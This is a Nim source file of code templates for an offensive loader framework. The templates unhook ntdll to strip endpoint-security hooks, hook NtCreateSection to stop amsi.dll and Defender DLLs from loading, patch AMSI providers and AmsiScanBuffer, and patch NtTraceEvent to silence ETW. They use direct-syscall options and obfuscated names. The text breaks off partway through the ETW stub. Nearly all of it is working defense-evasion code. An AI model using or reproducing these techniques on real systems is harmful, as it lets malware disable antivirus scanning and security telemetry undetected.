import strformat


let UnhookNtdllStub * = """


when not defined(DInvoke):
    from winim import MODULEINFO,GetModuleInformation

proc ntdllunhook(): bool =
  let low: uint16 = 0
  when defined(DInvoke):
    var processH = MyGetCurrentProcess()
  else:
    var processH = GetCurrentProcess()
  when defined(DInvoke):
      var ntdllModule = MyGetModuleHandleA(obf("ntdll.dll"))
  else:
      var ntdllModule = GetModuleHandleA(obf("ntdll.dll"))
  var 
      mi : MODULEINFO
      ntdllBase : LPVOID
      ntdllFile : FileHandle
      ntdllMapping : HANDLE
      ntdllMappingAddress : LPVOID
      hookedDosHeader : PIMAGE_DOS_HEADER
      hookedNtHeader : PIMAGE_NT_HEADERS
      hookedSectionHeader : PIMAGE_SECTION_HEADER

  when defined(DInvoke):
      discard MyGetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  else:
      discard GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open(obf("C:\\windows\\system32\\ntdll.dll"),fmRead))
  when defined(DInvoke):
      ntdllMapping = MyCreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  else:
      ntdllMapping = CreateFileMappingA(ntdllFile, NULL, PAGE_READONLY or SEC_IMAGE, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    when defined(verbose):
        echo obf("Could not create file mapping object ") &  fmt"({GetLastError()})."
    return false
  when defined(DInvoke):
      ntdllMappingAddress = MyMapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  else:
      ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    when defined(verbose):
        echo obf("Could not map view of file ") & fmt"({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  var status = 0
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toString(hookedSectionHeader.Name):
          var oldProtection: DWORD = 0
          var oldProtection2: DWORD = 0
          var bytesWritten: SIZE_T
          var ds: LPVOID = ntdllBase + hookedSectionHeader.VirtualAddress
          var pSize: SIZE_T = cast[SIZE_T](hookedSectionHeader.Misc.VirtualSize)
          when defined(SysWhispers):
              status = uashdiasdj(processH, &ds, &pSize, 0x04, &oldProtection)
              if status != 0:
                when defined(verbose):
                    echo obf("[!] uashdiasdj failed to modify memory permissions:") & fmt"{status}."
                return false
              status = oqiazasusjk(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
              if status != 0:
                when defined(verbose):
                    echo obf("[!] oqiazasusjk failed to write bytes to target address:") & fmt"{status}."
                return false
              status = uashdiasdj(processH, &ds, &pSize, oldProtection, &oldProtection2)
              if status != 0:
                when defined(verbose):
                    echo obf("[!] uashdiasdj failed to reset memory back to it's orignal protections:") & fmt"{status}."
                return false
          else:
              when defined(Hellsgate):
                  if getSyscall(ntProtectTable):              
                      syscall = ntProtectTable.wSysCall
                  else:
                      when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                      return false
                  # We need to use RWX here, as with RW the Syscall it'self (retrieved via HellsGate from memory ntdll) cannot execute anymore and the process crashes.
                  status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x40, addr oldProtection)    
              when defined(GetSyscallStub):
                  status = NtProtectVirtualMemory(processH, addr ds, addr pSize, 0x04, addr oldProtection)
              if status != 0:
                when defined(verbose):
                    echo obf("[!] NtProtectVirtualMemory failed to modify memory permissions:") & fmt"{status}."
                return false
              when defined(Hellsgate):
                  if getSyscall(ntWriteTable):
                      syscall = ntWriteTable.wSysCall
                  else:
                      when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
                      return false
              status = NtWriteVirtualMemory(processH, ds, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, pSize, addr bytesWritten);
              if status != 0:
                when defined(verbose):
                    echo obf("[!] NtWriteVirtualMemory failed to write bytes to target address:") & fmt"{status}."
                return false
              when defined(Hellsgate):
                  if getSyscall(ntProtectTable):
                      syscall = ntProtectTable.wSysCall
                  else:
                      when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
                      return false
              status = NtProtectVirtualMemory(processH, &ds, &pSize, oldProtection, &oldProtection2)
              if status != 0:
                when defined(verbose):
                    echo obf("[!] NtProtectVirtualMemory failed to reset memory back to it's orignal protections:") & fmt"{status}."
                return false  
  status = NtClose(processH)
  status = NtClose(ntdllFile)
  status = NtClose(ntdllMapping)
  when defined(DInvoke):
      discard MyFreeLibrary(ntdllModule)
  else:
      discard FreeLibrary(ntdllModule)
  return true


when isMainModule:
  when defined(GetSyscallStub):
      GetUnhookStubs()
  var result = ntdllunhook()
  when defined(verbose):
    echo obf("[*] unhook Ntdll: ") & fmt"{bool(result)}"

"""

let AMSINtCreateSectionHookStub * = """

import winim/lean
import strutils

type
    typeNtCreateSection* = proc (SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                       FileHandle: HANDLE): NTSTATUS {.stdcall.}


type
    MyNtFlushInstructionCache* = proc (ProcessHandle: HANDLE, BaseAddress: PVOID, NumberofBytestoFlush: ULONG): NTSTATUS {.stdcall.}



type
  HookedNtCreate* {.bycopy.} = object
    origNtCreate*: typeNtCreateSection
    ntCreateStub*: array[16, BYTE]

  HookTrampolineBuffers* {.bycopy.} = object
    originalBytes*: HANDLE    ##  (Input) Buffer containing bytes that should be restored while unhooking.
    originalBytesSize*: DWORD  ##  (Output) Buffer that will receive bytes present prior to trampoline installation/restoring.
    previousBytes*: HANDLE
    previousBytesSize*: DWORD


var ntdlldll = LoadLibraryA("ntdll.dll")
if (ntdlldll == 0):
    when defined(verbose):
        echo obf("[X] Failed to load ntdll.dll")

var NtFlushInstructionCacheAddress = GetProcAddress(ntdlldll,"NtFlushInstructionCache")
if isNil(NtFlushInstructionCacheAddress):
    when defined(verbose):
        echo obf("[X] Failed to get the address of 'NtFlushInstructionCache'")

var NtFlushInstructionCache*: MyNtFlushInstructionCache
NtFlushInstructionCache = cast[MyNtFlushInstructionCache](NtFlushInstructionCacheAddress)

proc hookntCreateSection*(): bool

proc fastTrampoline*(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
                    buffers: ptr HookTrampolineBuffers = nil): bool

var g_hookedNtCreate*: HookedNtCreate

var ntCreate_Address*: HANDLE

var NtCreateSection*: typeNtCreateSection

proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                       FileHandle: HANDLE): NTSTATUS

proc restore_hook_ntcreatesection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                       FileHandle: HANDLE): BOOL =

    var buffers: HookTrampolineBuffers

    buffers.originalBytes = cast[HANDLE](addr g_hookedNtCreate.ntCreateStub[0])
    buffers.originalBytesSize = DWORD(sizeof(g_hookedNtCreate.ntCreateStub))
     
    var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection"))
    var trampolinesuccess: bool = fastTrampoline(false, cast[LPVOID](ntCreate_Address), cast[LPVOID](MyNtCreateSection), &buffers)
    if (trampolinesuccess == false):
        when defined(verbose):
            echo obf("Failed to install trampoline")
        quit(1)
    else:
        when defined(verbose):
            echo obf("Restored old function values!")
    when defined(verbose):
        echo obf("Calling real NtCreateSection\r\n")
    
    NtCreateSection = cast[typeNtCreateSection](addressToHook)
    discard NtCreateSection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)
    when defined(verbose):
        echo obf("RE-Hooking")
    hookntCreateSection()

proc MyNtCreateSection(SectionHandle: PHANDLE, DesiredAccess: ULONG, ObjectAttributes: POBJECT_ATTRIBUTES,
                       MaximumSize: PLARGE_INTEGER, PageAttributess: ULONG, SectionAttributes: ULONG,
                       FileHandle: HANDLE): NTSTATUS =

    if(FileHandle != 0):
        var lpFileName: array[4096, WCHAR]
        var res: DWORD = GetFinalPathNameByHandle(FileHandle, cast[LPWSTR](addr lpFileName), DWORD(256), DWORD(FILE_NAME_OPENED or VOLUME_NAME_DOS)) # Get the file path of the file handle
        if (res == 0):
            when defined(verbose):
                echo obf("[X] Failed to get the file path of the file handle")
        else:
            when defined(verbose):
                echo obf("GetFinalPathNameByHandleA success")
            
            var dllName: string = $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
            when defined(verbose):
                echo obf("Following DLL wants to be loaded: "), $$cast[LPWSTR](cast[int](addr lpFileName) + 8)
            if(("amsi.dll" in dllName) or ("MpOAV.dll" in dllName) or ("MpClient.dll" in dllName) or ("MsMpLics.dll" in dllName)):
                when defined(verbose):
                    echo obf("[X] AMSI is being loaded")
                    echo obf("Stopping it")
                return 0 # Return 0 to prevent AMSI from being loaded
                # If set -1, will trigger SEH exception and will show an error in the screen (but also works)
            else:
                if(restore_hook_ntcreatesection(SectionHandle, DesiredAccess, ObjectAttributes, MaximumSize, PageAttributess, SectionAttributes, FileHandle)): #If it's not an AMSI DLL restore the original NtCreateSection
                    when defined(verbose):
                        echo obf("Restore success")
proc fastTrampoline(installHook: bool; addressToHook: LPVOID; jumpAddress: LPVOID;
                    buffers: ptr HookTrampolineBuffers): bool =
    var trampoline: seq[byte]
    if defined(amd64):
        trampoline = @[
            byte(0x49), byte(0xBA), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov r10, addr
            byte(0x00),byte(0x00),byte(0x41), byte(0xFF),byte(0xE2)                                         # jmp r10
        ]
        var tempjumpaddr: uint64 = cast[uint64](jumpAddress)
        copyMem(&trampoline[2] , &tempjumpaddr, 6)
    elif defined(i386):
        trampoline = @[
            byte(0xB8), byte(0x00), byte(0x00), byte(0x00), byte(0x00), # mov eax, addr
            byte(0x00),byte(0x00),byte(0xFF), byte(0xE0)                                      # jmp eax
        ]
        var tempjumpaddr: uint32 = cast[uint32](jumpAddress)
        copyMem(&trampoline[1] , &tempjumpaddr, 3)
    
    var dwSize: DWORD = DWORD(len(trampoline))
    var dwOldProtect: DWORD = 0
    var output: bool = false
    

    if (installHook):
        if (buffers != nil):
            if ((buffers.previousBytes == 0) or buffers.previousBytesSize == 0):
                when defined(verbose):
                    echo obf("Previous Bytes == 0")
                return false
            copyMem(unsafeAddr buffers.previousBytes, addressToHook, buffers.previousBytesSize)

        if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
            when defined(verbose):
                echo obf("Virtual Protect to RWX success!")
            copyMem(addressToHook, addr trampoline[0], dwSize)
            output = true
    else:
        when defined(verbose):
            echo obf("Restoring old NtCreateSection!")
            echo obf("Original Bytes restore address: "), toHex(buffers.originalBytes)
            echo obf("Original Bytes Size: "), buffers.originalBytesSize
        if (buffers != nil):
            if ((buffers.originalBytes == 0) or buffers.originalBytesSize == 0):
                when defined(verbose):
                    echo obf("Original Bytes == 0")
                return false

            dwSize = buffers.originalBytesSize

            if (VirtualProtect(addressToHook, dwSize, PAGE_EXECUTE_READWRITE, &dwOldProtect)):
                copyMem(addressToHook, cast[LPVOID](buffers.originalBytes), dwSize)
                output = true
    
    var status = NtFlushInstructionCache(GetCurrentProcess(), addressToHook, dwSize)
    if (status == 0):
        when defined(verbose):
            echo obf("NtFlushInstructionCache success")
    else:
        when defined(verbose):
            echo obf("NtFlushInstructionCache failed: "), toHex(status)
    VirtualProtect(addressToHook, dwSize, dwOldProtect, &dwOldProtect)

    return output

proc hookntCreateSection(): bool =
    var addressToHook: LPVOID = cast[LPVOID](GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateSection"))
    ntCreate_Address = cast[HANDLE](addressToHook)
    var buffers: HookTrampolineBuffers
    var output: bool = false
    
    if (addressToHook == nil):
        return false
        
    buffers.previousBytes = cast[HANDLE](addressToHook)
    buffers.previousBytesSize = DWORD(sizeof(addressToHook))
    g_hookedNtCreate.origNtCreate = cast[typeNtCreateSection](addressToHook)
    var PointerToOrigBytes: LPVOID = addr g_hookedNtCreate.ntCreateStub
    copyMem(PointerToOrigBytes, addressToHook, 16)
    
    output = fastTrampoline(true, cast[LPVOID](addressToHook), cast[LPVOID](MyNtCreateSection), &buffers)
    return output

var hooksuccess = hookntCreateSection()
when defined(verbose):
    echo obf("Hook:"), hooksuccess


"""


let AMSIProviderPatchStub * = """

from winregistry/winregistry import RegHandle,open,enumSubkeys,readString,samRead,enumValueNames

var
  CLSID: string
  ProviderDLLs: seq[string]
  ProviderHandle: RegHandle
  InProcServer32Handle: RegHandle
# http://miere.ru/docs/registry/
proc getProviderDLLs(): seq[string] =
  try:
    ProviderHandle = open("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\AMSI\\Providers\\", samRead)
  except OSError:
    echo "err: ", getCurrentExceptionMsg()
  finally:
    for CLSID in enumSubkeys(ProviderHandle):
      #echo CLSID
      var ProviderKey: string = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Classes\\CLSID\\"
      ProviderKey.add(CLSID)
      ProviderKey.add("\\InprocServer32\\") 
      try:
        InProcServer32Handle = open(ProviderKey, samRead)
      except OSError:
        echo "err: ", getCurrentExceptionMsg()
      ProviderDLLs.add(readString(InProcServer32Handle, ""))

    return ProviderDLLs

proc ProviderPatchAmsi(): void =
    var
        amsi: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    elif defined i386:
        const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    
    var ProviderDLLs: seq[string] = getProviderDLLs()

    for DLL in ProviderDLLs:
      var DLLtoLoad = DLL
      DLLtoLoad.removePrefix('"')
      DLLtoLoad.removeSuffix('"')

      when defined(DInvoke):
        amsi = MyLoadLibraryA(DLLtoLoad)
      else:
        amsi = LoadLibraryA(DLLtoLoad)
      if (amsi == 0):
        when defined(verbose):
          echo obf("[X] Failed to load "), DLLtoLoad
          return
      else:
        when defined(verbose):
          echo obf("[+] Loaded "), DLLtoLoad
      when defined(DInvoke):
        cs = MyGetProcAddress(amsi,obf("DllGetClassObject"))
      else:
        cs = GetProcAddress(amsi,obf("DllGetClassObject"))
      if isNil(cs):
        when defined(verbose):
            echo obf("[X] Failed to get the address of 'DllGetClassObject'")
        return
      
      var oldProtection: DWORD = 0
      var success: BOOL
      var protectAddress = cs
      var friendlycodeLength = cast[SIZE_T](patch.len)
      when defined(DInvoke):
        var pHandle: HANDLE = MyGetCurrentProcess()
      else:
        var pHandle: HANDLE = GetCurrentProcess()
      var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID
    
      when defined(GetSyscallStub):
        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
        # Define NtProtectVirtualMemory
        var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        # define NtWriteVirtualMemory
        let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
            
      when defined(SysWhispers):
        status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to change memory protections.")
        else:
            when defined(verbose):
                echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")
        var 
            bytesWritten: SIZE_T
        var outLength: SIZE_T
        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to write memory.")
        else:
            when defined(verbose):
                echo obf("[+] oqiazasusjk Succeed!")
                
               
        status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to allocate memory.")
        else:
            when defined(verbose):
                echo obf("[+] OldProtect set back")
            disabled = true
      else:
        when defined(HellsGate):
            if getSyscall(ntProtectTable):                
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return
        when defined(verbose):
            echo obf("[*] Applying Syscall AMSI patch")
        when defined(HellsGate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
        var outLength: SIZE_T
    
        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
    
        if (success != 0):
            when defined(verbose):
                echo obf("NtWriteVirtualMemory failed")
            return
        
        when defined(HellsGate):
            if getSyscall(ntProtectTable):
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return
        else:
            when defined(verbose):
                echo obf("[*] OldProtect set back")
            disabled = true
        
        when defined(GetSyscallStub):
            when defined(DInvoke):
                success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            else:
                success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            # Fails for some reason
            #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
            when defined(verbose):
                echo obf("[*] Restored Stub protections: ") & $success
      when defined(verbose):
        echo obf("[*] AMSI disabled: ") & $disabled
    return
when isMainModule:
    ProviderPatchAmsi()
"""

let AMSIStub * = """
proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
    
    when defined amd64:
        let patch: array[1, byte] = [byte 0x75] # Patch to JNZ, old value was 0x74 (JNZ)
    elif defined i386:
        let patch: array[1, byte] = [byte 0x75]
    
    when defined(DInvoke):
        amsi = MyLoadLibraryA(obf("amsi.dll"))
    else:
        amsi = LoadLibraryA(obf("amsi.dll"))
    if (amsi == 0):
        when defined(verbose):
            echo obf("[X] Failed to load amsi.dll")
        return disabled

    when defined(DInvoke):
        cs = MyGetProcAddress(amsi,obf("AmsiScanBuffer"))
    else:
        cs = GetProcAddress(amsi,obf("AmsiScanBuffer"))
    if isNil(cs):
        when defined(verbose):
            echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
        return disabled
    when defined amd64:
        cs = cs + 0x6D # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
        #cs = cs + 0x83 # Old value for Win10 to change JNZ to JZ. Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    else:
        #cs = cs + 0x75 # old value
        cs = cs + 0x47 # Since Win11, there is no more JNZ, but JZ So we're going to patch the JZ to JNZ
    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    when defined(DInvoke):
        var pHandle: HANDLE = MyGetCurrentProcess()
    else:
        var pHandle: HANDLE = GetCurrentProcess()
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID
    
    when defined(GetSyscallStub):
        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
        # Define NtProtectVirtualMemory
        var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        # define NtWriteVirtualMemory
        let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
            
    when defined(SysWhispers):
        status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x04,addr t)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to change memory protections.")
        else:
            when defined(verbose):
                echo obf("[*] Applying Syscall (SysWhispers) AMSI patch")

        var 
            bytesWritten: SIZE_T

        var outLength: SIZE_T
        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)

        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to write memory.")
        else:
            when defined(verbose):
                echo obf("[+] oqiazasusjk Succeed!")
                
               
        status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to allocate memory.")
        else:
            when defined(verbose):
                echo obf("[+] OldProtect set back")
            disabled = true
    else:
        when defined(HellsGate):
            if getSyscall(ntProtectTable):                
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x04,addr t) 
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return disabled
        when defined(verbose):
            echo obf("[*] Applying Syscall AMSI patch")

        when defined(HellsGate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
        var outLength: SIZE_T
    
        success = NtWriteVirtualMemory(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)
    
        if (success != 0):
            when defined(verbose):
                echo obf("NtWriteVirtualMemory failed")
            return disabled
        
        when defined(HellsGate):
            if getSyscall(ntProtectTable):
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success =  NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
        if (success != 0):
            when defined(verbose):
                echo obf("NtProtectVirtualMemory failed")
            return disabled
        else:
            when defined(verbose):
                echo obf("[*] OldProtect set back")
            disabled = true
        
        when defined(GetSyscallStub):
            when defined(DInvoke):
                success = MyVirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            else:
                success = VirtualProtect(syscallStub_NtProtect, 4096, PAGE_READWRITE, addr op)
            # Fails for some reason
            #success = NtProtectVirtualMemory(pHandle,addr syscallStub_NtProtect,addr friendlycodeLength,PAGE_READWRITE,addr op)
            when defined(verbose):
                echo obf("[*] Restored Stub protections: ") & $success

    return disabled

when isMainModule:
    success = PatchAmsi()
    when defined(verbose):
        echo obf("[*] AMSI disabled: ") & fmt"{bool(success)}"
"""


let ETWPatchStub * = """
proc Patchntdll(): bool =
    var
        ntdll: HMODULE
        cs: pointer
        op: ULONG
        t: ULONG
        disabled: bool = false
        PatchAPIs: seq[string] = @[obf("NtTraceEvent")] # Credit to @MrUn1k0d3r - https://players.brightcove.net/3755095886001/default_default/index.html?videoId=6308564004112
    when defined amd64:
        let patch: array[1, byte] = [byte 0xc3]
    elif defined i386:
        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
    when defined(DInvoke):
        ntdll = MyLoadLibraryA(obf("ntdll"))
    else:
        ntdll = LoadLibraryA(obf("ntdll"))
    if (ntdll == 0):
        when defined(verbose):
            echo obf("[X] Failed to load ntdll.dll")
        return disabled

    for singleAPI in PatchAPIs:
        when defined(verbose):
            echo obf("[*] Patching : "),singleAPI

        when defined(DInvoke):
            cs = MyGetProcAddress(ntdll,singleAPI)
        else:
            cs = GetProcAddress(ntdll,singleAPI)
        if isNil(cs):
            when defined(verbose):
                echo obf("[X] Failed to get the address of "), singleAPI
            break

    var oldProtection: DWORD = 0
    var success: BOOL
    var protectAddress = cs
    var friendlycodeLength = cast[SIZE_T](patch.len)

    when defined(DInvoke):
        var pHandle: HANDLE = MyGetCurrentProcess()
    else:
        var pHandle: HANDLE = GetCurrentProcess()
    var 
        status          : NTSTATUS          = 0x00000000
        buffer          : LPVOID
    
    when defined(GetSyscallStub):
        var syscallStub_NtWrite: HANDLE = cast[HANDLE](syscallStub_NtProtect) + cast[HANDLE](SYSCALL_STUB_SIZE)
        # Define NtProtectVirtualMemory
        var NtProtectVirtualMemory: myNtProtectVirtM = cast[myNtProtectVirtM](cast[LPVOID](syscallStub_NtProtect))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtProtect), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        # define NtWriteVirtualMemory
        let NtWriteVirtualMemory = cast[myNtWriteVirtM](cast[LPVOID](syscallStub_NtWrite))
        when defined(DInvoke):
            success = MyVirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        else:
            success = VirtualProtect(cast[LPVOID](syscallStub_NtWrite), cast[SIZE_T](SYSCALL_STUB_SIZE), PAGE_EXECUTE_READWRITE, addr oldProtection)
        success = GetSyscallStub("NtProtectVirtualMemory", cast[LPVOID](syscallStub_NtProtect))
        success = GetSyscallStub("NtWriteVirtualMemory", cast[LPVOID](syscallStub_NtWrite))
            
    when defined(SysWhispers):
        status = uashdiasdj(pHandle, addr protectAddress,addr friendlycodeLength,0x40,addr t)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to change memory protections.")
        else:
            when defined(verbose):
                echo obf("[*] Applying Syscall (SysWhispers) ETW patch")

        var 
            bytesWritten: SIZE_T

        var outLength: SIZE_T
        status = oqiazasusjk(pHandle,cs,unsafeAddr patch,SIZE_T(patch.len),addr outLength)

        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to write memory.")
        else:
            when defined(verbose):
                echo obf("[+] oqiazasusjk Succeed!")
                
               
        status = uashdiasdj(pHandle,addr protectAddress,addr friendlycodeLength,cast[ULONG](t),addr op)
                
        if not NT_SUCCESS(status):
            when defined(verbose):
                echo obf("[-] Failed to allocate memory.")
        else:
            when defined(verbose):
                echo obf("[+] OldProtect set back")
            disabled = true
    else:
        when defined(HellsGate):
            if getSyscall(ntProtectTable):                
                syscall = ntProtectTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
        success = NtProtectVirtualMemory(pHandle,addr protectAddress,addr friendlycodeLength,0x40,addr t) 
